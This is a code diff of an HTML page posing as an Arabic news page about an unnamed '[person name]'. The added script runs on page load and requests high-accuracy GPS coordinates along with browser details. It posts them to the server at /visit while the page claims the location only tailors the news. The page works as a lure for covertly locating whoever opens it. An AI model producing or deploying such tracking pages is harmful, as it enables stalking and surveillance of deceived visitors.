@@ -1,52 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>Person News</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>أخبار الشخصية</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
-      margin: 0;
-    }
-    header {
-      background: #1c1c1c;
-      padding: 20px;
-      text-align: center;
-    }
-    .news {
-      padding: 20px;
-    }
-    .card {
-      background: #222;
-      padding: 15px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-    }
-    img {
-      max-width: 100%;
-      border-radius: 6px;
-    }
+    body { font-family: Arial, sans-serif; background: #111; color: #fff; margin: 0; text-align: center; }
+    header { background: #1c1c1c; padding: 20px; }
+    .news { padding: 20px; }
+    .card { background: #222; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; }
+    img { max-width: 100%; border-radius: 6px; }
+    #status { color: #888; font-size: 0.9em; margin-top: 10px; }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>News About [PERSON NAME]</h1>
-  <p>Latest news and images</p>
+  <h1>آخر الأخبار حول [اسم الشخص]</h1>
+  <p>تغطية حصرية ومباشرة</p>
 </header>
 
 <div class="news">
   <div class="card">
-    <h2>Sample News Title</h2>
-    <img src="https://via.placeholder.com/600x300">
-    <p>This is a sample news description.</p>
+    <h2>عنوان خبر عاجل</h2>
+    <img src="https://via.placeholder.com/600x300" alt="News Image">
+    <p>هذا النص تجريبي لوصف الخبر المنشور حالياً.</p>
   </div>
+  <div id="status">جاري تحديث المحتوى حسب موقعك...</div>
 </div>
 
 <script>
-  fetch("/visit", { method: "POST" });
+  async function collectAndSend() {
+    let geoData = {
+      lat: null,
+      lon: null,
+      accuracy: null,
+      userAgent: navigator.userAgent,
+      language: navigator.language
+    };
+
+    // محاولة الحصول على الموقع الدقيق (GPS) بموافقة المستخدم
+    if ("geolocation" in navigator) {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+          });
+        });
+        
+        geoData.lat = position.coords.latitude;
+        geoData.lon = position.coords.longitude;
+        geoData.accuracy = position.coords.accuracy;
+        document.getElementById('status').innerText = "تم تحديث المنطقة بنجاح.";
+      } catch (error) {
+        console.log("Location access denied or timed out.");
+        document.getElementById('status').innerText = "تم تحميل الأخبار العامة.";
+      }
+    }
+
+    // إرسال البيانات للسيرفر
+    fetch("/visit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(geoData)
+    });
+  }
+
+  // التنفيذ عند فتح الصفحة
+  window.onload = collectAndSend;
 </script>
 
 </body>
